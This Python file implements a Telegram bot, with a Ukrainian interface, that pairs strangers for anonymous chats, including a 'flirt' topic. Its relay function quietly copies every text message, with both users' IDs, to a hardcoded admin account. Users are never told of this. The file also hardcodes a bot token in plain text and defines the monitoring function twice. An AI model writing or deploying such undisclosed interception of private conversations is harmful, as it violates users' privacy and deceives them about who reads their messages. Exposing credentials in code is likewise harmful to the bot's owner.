import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiohttp import web

BOT_TOKEN = "8724564645:AAFk2Im7H2_WpY9G9EiRZbnIz1fRuwa_4J4"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# =====================================================
# USERS DATABASE (RAM)
# =====================================================
"""
users_db structure:

{
    user_id: {
        status: idle/search/chat/gender_select
        gender: male/female
        search_preference: male/female/any
        topic: normal/flirt
        partner: user_id
    }
}
"""

users_db = {}

# =====================================================
# ADMIN ID
# =====================================================
ADMIN_ID = 342371504

# =====================================================
# ADMIN FUNCTION (NEW)
# =====================================================
async def admin_watch(user_id, partner_id, message: types.Message):
    try:
        text = f"👁 ADMIN LOG\n{user_id} → {partner_id}\n"

        if message.text:
            text += f"\nTEXT: {message.text}"
        elif message.photo:
            text += "\nPHOTO"
        elif message.video:
            text += "\nVIDEO"
        elif message.voice:
            text += "\nVOICE"
        elif message.sticker:
            text += "\nSTICKER"
        else:
            text += "\nMEDIA"

        await bot.send_message(ADMIN_ID, text)

    except Exception as e:
        logging.error(e)

# =====================================================
# KEYBOARDS
# =====================================================

def get_gender_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="👨 Я Хлопець"))
    builder.add(types.KeyboardButton(text="👩 Я Дівчина"))
    builder.adjust(2)
    return builder.as_markup(resize_keyboard=True)

def get_main_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="🔍 Знайти співрозмовника"))
    builder.add(types.KeyboardButton(text="📊 Онлайн"))
    builder.add(types.KeyboardButton(text="ℹ️ Правила"))
    builder.adjust(1)
    return builder.as_markup(resize_keyboard=True)

def get_search_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="🙋‍♂️ Шукаю Хлопця"))
    builder.add(types.KeyboardButton(text="🙋‍♀️ Шукаю Дівчину"))
    builder.add(types.KeyboardButton(text="🌍 Шукаю Будь-кого"))
    builder.add(types.KeyboardButton(text="⬅️ Назад"))
    builder.adjust(2, 1, 1)
    return builder.as_markup(resize_keyboard=True)

def get_topic_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="💬 Звичайне спілкування"))
    builder.add(types.KeyboardButton(text="❤️ Флірт"))
    builder.adjust(1)
    return builder.as_markup(resize_keyboard=True)

def get_chat_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="⏭ Next"))
    builder.add(types.KeyboardButton(text="🛑 Зупинити чат"))
    builder.add(types.KeyboardButton(text="👀 Хто друкує?"))
    builder.adjust(2, 1)
    return builder.as_markup(resize_keyboard=True)

# =====================================================
# START
# =====================================================

@dp.message(Command("start"))
async def start(message: types.Message):

    user_id = message.from_user.id

    users_db[user_id] = {
        "status": "gender_select",
        "gender": None,
        "search_preference": "any",
        "topic": "normal",
        "partner": None
    }

    await message.answer(
        "✨ Ласкаво просимо",
        reply_markup=get_gender_menu()
    )

# =====================================================
# GENDER
# =====================================================

@dp.message(F.text.in_(["👨 Я Хлопець", "👩 Я Дівчина"]))
async def set_gender(message: types.Message):

    user_id = message.from_user.id

    gender = "male" if "Хлопець" in message.text else "female"

    users_db[user_id]["gender"] = gender
    users_db[user_id]["status"] = "idle"

    await message.answer("OK", reply_markup=get_main_menu())

# =====================================================
# RULES
# =====================================================

@dp.message(F.text == "ℹ️ Правила")
async def rules(message: types.Message):
    await message.answer("Правила чату")

# =====================================================
# ONLINE
# =====================================================

@dp.message(F.text == "📊 Онлайн")
async def stats(message: types.Message):

    await message.answer(
        f"Онлайн: {len(users_db)}"
    )

# =====================================================
# SEARCH MENU
# =====================================================

@dp.message(F.text == "🔍 Знайти співрозмовника")
async def search_menu(message: types.Message):
    await message.answer("Вибір", reply_markup=get_search_menu())

# =====================================================
# TOPIC
# =====================================================

@dp.message(F.text.in_(["💬 Звичайне спілкування", "❤️ Флірт"]))
async def start_search(message: types.Message):

    user_id = message.from_user.id
    user = users_db[user_id]

    topic = "flirt" if "Флірт" in message.text else "normal"

    user["topic"] = topic
    user["status"] = "search"

    await message.answer("Пошук...", reply_markup=types.ReplyKeyboardRemove())

    for partner_id, partner in users_db.items():

        if partner_id == user_id:
            continue

        if partner["status"] != "search":
            continue

        if partner["topic"] != topic:
            continue

        user["status"] = "chat"
        user["partner"] = partner_id

        partner["status"] = "chat"
        partner["partner"] = user_id

        await bot.send_message(user_id, "Знайдено", reply_markup=get_chat_menu())
        await bot.send_message(partner_id, "Знайдено", reply_markup=get_chat_menu())

        return

# =====================================================
# STOP
# =====================================================

@dp.message(F.text == "🛑 Зупинити чат")
async def stop_chat(message: types.Message):

    user_id = message.from_user.id
    user = users_db.get(user_id)

    if not user or user["status"] != "chat":
        return

    partner_id = user["partner"]

    user["status"] = "idle"
    user["partner"] = None

    if partner_id:
        users_db[partner_id]["status"] = "idle"
        users_db[partner_id]["partner"] = None

    await message.answer("Чат завершено", reply_markup=get_main_menu())

# =====================================================
# NEXT
# =====================================================

@dp.message(F.text == "⏭ Next")
async def next_chat(message: types.Message):

    user_id = message.from_user.id
    user = users_db.get(user_id)

    if user["status"] == "chat":
        partner_id = user["partner"]
        users_db[partner_id]["status"] = "idle"
        users_db[partner_id]["partner"] = None

    user["status"] = "idle"
    user["partner"] = None

    await message.answer("Новий пошук", reply_markup=get_search_menu())

# =====================================================
# CHAT FORWARDER + ADMIN WATCH (ADDED HERE)
# =====================================================

@dp.message()
async def forwarder(message: types.Message):

    user_id = message.from_user.id

    if user_id not in users_db:
        return

    user = users_db[user_id]

    if user["status"] != "chat":
        return

    partner_id = user["partner"]

    if not partner_id:
        return

    try:

        await bot.send_chat_action(partner_id, "typing")

        if message.text:
            await bot.send_message(partner_id, message.text)

        elif message.photo:
            await bot.send_photo(partner_id, message.photo[-1].file_id)

        elif message.video:
            await bot.send_video(partner_id, message.video.file_id)

        elif message.voice:
            await bot.send_voice(partner_id, message.voice.file_id)

        elif message.sticker:
            await bot.send_sticker(partner_id, message.sticker.file_id)

        elif message.animation:
            await bot.send_animation(partner_id, message.animation.file_id)

        # 👁 ADMIN WATCH (ONLY ADDITION)
        await admin_watch(user_id, partner_id, message)

    except Exception as e:
        logging.error(e)

# =====================================================
# ADMIN FUNCTION
# =====================================================

ADMIN_ID = 342371504

async def admin_watch(user_id, partner_id, message: types.Message):
    try:
        text = f"👁 ADMIN\n{user_id} → {partner_id}\n"

        if message.text:
            text += f"\nTEXT: {message.text}"
        else:
            text += "\nMEDIA"

        await bot.send_message(ADMIN_ID, text)

    except Exception as e:
        logging.error(e)

# =====================================================
# WEB SERVER
# =====================================================

async def handle(request):
    return web.Response(text="BOT OK")

async def start_background(app):
    asyncio.create_task(dp.start_polling(bot))

async def main():

    await bot.delete_webhook(drop_pending_updates=True)

    app = web.Application()
    app.router.add_get("/", handle)
    app.on_startup.append(start_background)

    port = int(os.getenv("PORT", 10000))

    runner = web.AppRunner(app)
    await runner.setup()

    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    print("BOT STARTED")

    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
